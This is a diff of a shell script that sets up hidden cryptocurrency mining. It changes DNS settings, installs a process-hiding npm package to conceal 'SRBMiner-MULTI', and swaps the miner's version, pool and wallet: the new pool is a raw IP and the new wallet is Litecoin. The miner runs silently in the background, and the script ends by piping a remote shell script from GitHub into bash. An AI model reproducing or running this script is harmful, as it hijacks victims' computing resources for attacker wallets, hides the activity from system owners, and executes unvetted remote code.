@@ -11,8 +11,8 @@ rm cikblek.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.2.8/SRBMiner-Multi-3-2-8-Linux.tar.gz >/dev/null 2>&1
-tar -xzvf SRBMiner-Multi-3-2-8-Linux.tar.gz
-cd SRBMiner-Multi-3-2-8
-./SRBMiner-MULTI --algorithm randomx --pool zeph-eu.kryptex.network:7030 --wallet ZEPHs8jyUPSQoopYn8BM7Dcs76qajS9XHQ9GeR5CALDyadtXWdeiFP56qPntU8BnpR8gYBsNrMkfLB5Vko8XXGg57jDT8sEmy6J."gP$RANDOM" >/dev/null 2>&1 &
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz >/dev/null 2>&1
+tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
+cd SRBMiner-Multi-2-4-8
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://104.207.92.96:443 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."p$RANDOM" >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
